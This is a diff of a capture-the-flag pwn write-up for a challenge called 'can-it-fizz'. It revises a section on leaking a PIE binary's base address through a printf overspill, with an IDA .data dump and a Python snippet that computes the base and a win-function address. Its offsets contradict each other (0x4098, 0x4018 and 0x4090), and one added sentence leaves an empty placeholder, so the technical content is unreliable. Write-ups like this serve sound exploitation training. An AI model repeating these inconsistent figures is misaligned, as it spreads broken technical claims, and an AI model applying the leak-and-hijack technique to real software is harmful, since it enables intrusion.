@@ -14381,11 +14381,33 @@ After this iteration the counter increments: `−1 + 1 = 0`. The next iteration 
 
 ### Stage 2: Leaking `binary_base`
 
-At `i = 0` (FizzBuzz), `src` is set to `&fuzzbuzz = binary_base + 0x4098` by the branch. The same counter bridge trick applies: we send 24 A's followed by `p32(0xFFFFFFFF)`, `printf` spills the 6 non-NULL bytes of `&fuzzbuzz`, and the loop wraps again to `i = 0`.
+At `i = 0` (FizzBuzz), `src` is set to `&fuzzbuzz` by the branch. 
+
+Looking at the IDA dump, we can see that the `&fuzzbuzz` string is at an offset of `` from the base of the binary.
+
+```asm title="/challenge/can-it-fizz :: .data"
+# ---- snip ----
+
+.data:0000000000004018                 public fuzzbuzz
+.data:0000000000004018 fuzzbuzz        db  46h ; F             ; DATA XREF: challenge+B3↑o
+.data:0000000000004019                 db  69h ; i
+.data:000000000000401A                 db  7Ah ; z
+.data:000000000000401B                 db  7Ah ; z
+.data:000000000000401C                 db  42h ; B
+.data:000000000000401D                 db  75h ; u
+.data:000000000000401E                 db  7Ah ; z
+.data:000000000000401F                 db  7Ah ; z
+
+# ---- snip ----
+```
+
+So, if we leak the address of `&fuzzbuzz`, we can leak the address of the binary base: `binary_base = &fuzzbuzz - 0x4098`.
+
+The same counter bridge trick applies: we send 24 A's followed by `p32(0xFFFFFFFF)`, `printf` spills the 6 non-NULL bytes of `&fuzzbuzz`, and the loop wraps again to `i = 0`.
 
 ```python
 raw         = p.recvn(34)
-leaked_pie  = u64(raw[28:34] + b"\x00\x00")   # src = &fuzzbuzz
+leaked_pie  = u64(raw[28:34] + b"\x00\x00")    # src = &fuzzbuzz
 binary_base = leaked_pie - FIZZ_OFFSET         # FIZZ_OFFSET = 0x4090
 win_addr    = binary_base + WIN_OFFSET         # WIN_OFFSET  = 0x12c9
 ```
